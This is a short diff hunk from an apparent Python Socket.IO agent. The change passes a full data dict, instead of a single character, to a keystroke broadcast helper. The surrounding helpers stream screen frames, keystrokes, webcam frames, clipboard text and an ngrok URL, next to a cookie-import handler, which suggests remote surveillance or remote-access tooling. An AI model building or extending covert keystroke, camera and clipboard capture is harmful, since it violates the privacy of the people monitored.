@@ -205,7 +205,7 @@ def on_import_cookies(data):
 
 # ── Broadcast helpers ─────────────────────────────────────────────────────────
 def broadcast_frame(b64):      socketio.emit("frame",        {"data": b64,  "_agent": _AGENT_NAME})
-def broadcast_key(char):       socketio.emit("key",          {"char": char, "_agent": _AGENT_NAME})
+def broadcast_key(data):       socketio.emit("key",          {**data,       "_agent": _AGENT_NAME})
 def broadcast_camera(b64):     socketio.emit("camera_frame", {"data": b64,  "_agent": _AGENT_NAME})
 def broadcast_clipboard(text): socketio.emit("clipboard",    {"text": text, "_agent": _AGENT_NAME})
 def broadcast_ngrok_url(url):  socketio.emit("ngrok_url",   {"url": url,   "_agent": _AGENT_NAME})
